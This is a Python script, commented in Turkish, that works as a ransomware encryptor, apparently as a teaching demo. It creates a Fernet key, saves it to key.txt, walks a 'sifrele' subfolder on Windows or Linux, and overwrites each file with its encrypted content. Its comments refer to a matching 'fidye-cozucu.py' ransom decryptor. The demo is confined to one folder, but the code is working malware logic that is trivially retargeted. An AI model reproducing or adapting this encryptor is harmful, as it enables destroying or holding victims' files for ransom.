import os # belirtilen dizine ve dosyalarına erişebilmek için os kütüphanesi içe aktarılır.
from cryptography.fernet import Fernet # Hash üretip Dosyaları şifrelememize ve çözmemize yaran kütüphane
import platform

key = Fernet.generate_key() # Dosyaları şifrelemek için ve sonrasında şifrelenen dosyaları açabilmek için anahtar oluşturuyoruz.
print(key)

key = str(key)[2:-1] # Oluşan anahtarın tırnaksız olan taraflarını yani asıl anahtarı parçalayıp bir değişkene atıyoruz.

"""
Şifrelenen dosyalar oluşan anahtarla şifrelendiği için daha sonradan
sadece bu anahtar yardımıyla dosyaları eski haline getirilebilir.
Bu yüzden anahtarı kaybetmemek için key.txt isimli bir metin dosyasına
kaydediyoruz.
"""
f = open("key.txt","w") 
f.write(key)
f.close()

ferNet = Fernet(key) # Burada oluşan anahtarı Fernet sınıfına verip bir değişkene atıyoruz. Böylelikle şifreleme ve çözme işlemlerini yapabiliriz.

# print("***********************"*3)

"""
sifrele fonksiyonunda parametre olarak alttaki for döngüsünün içinde aldığımız dosya yollarını vererek
bu dosyaların içeriğini öncelikle okuyoruz. Sonra bu dosyaların içeriğini şifreliyoruz. Şifrelenmiş halini
dosyaya yazıyoruz. Dosyanın içeriği artık şifrelenmiş oluyor ve bu şifrenin anahtarı olmadan eski haline
dönmesi mümkün değil. Bu sebepten dosyanın şifrelenmiş halini çözüp eski hale getirecek 'fidye-cozucu.py'
isimli python betiğini hazırlıyoruz.
"""

def sifrele(dosya):
    with open(dosya,"rb") as readFile:
        okunanDosya = readFile.read()
    
    with open(dosya,"wb") as writeFile:
        try:
            sifreliHal = ferNet.encrypt(okunanDosya)
            writeFile.write(sifreliHal)
            writeFile.close()
            readFile.close()
        except:
            print("Bir hata oluştu")


"""
Öncelikle kullandığımız işletim sistemine göre kodların çalışabilmesi için gereken kontroller yapılmıştır.
os kütüphanesinin içinde walk isimli fonksiyona şifrelenmesini istediğimiz dosyaların bulunduğu dizini
veriyoruz. Bu dizini Linux'ta verirken "/" ile, Windows'ta ise "\" ile dizinleri belirtmemiz gerekiyor. Bu fonksiyon 3 ayrı değer döner. İlk değer dosya yolunu, ikincisi boş bir liste, üçüncüsü ise
dizinde bulunan dosyaları listeler.

Bu şekilde os.walk() fonksiyonunu for döngüsüne sokarak 3 ayrı değere de erişmiş oluyoruz.
Akabinde 3. olarak dönen değer olan files parametresi dosyaları bir liste içinde barındırıyor.
Bu listede dosya isimlerine tek tek erişebilmek için bunları bir for döngüsüne sokuyoruz.
Sonra tam dosyaların tam yolunu verebilmemiz için path ile dosyaların isimlerini birleştirip bir değişkene atıyoruz.
Ve bulduğumuz dosyaları barındıran değişkeni bu dosyaları şifrelemek için kullanacağımız 
sifrele() fonksiyonuna parametre olarak veriyoruz.
"""

if platform.system() == "Windows":
    for path,gereksiz,files in os.walk(os.getcwd()+"\sifrele"): 
        #print(path,gereksiz,files)
        for dosyalar in files:
            dosyaYolu = path + "\\" + dosyalar
            sifrele(dosyaYolu)
elif platform.system() == "Linux":
    for path,gereksiz,files in os.walk(os.getcwd()+"/sifrele"): 
        #print(path,gereksiz,files)
        for dosyalar in files:
            dosyaYolu = path + "/" + dosyalar
            sifrele(dosyaYolu)
else:
    print("Kullandığınız işletim sistemi bu program tarafından desteklenmiyor.")



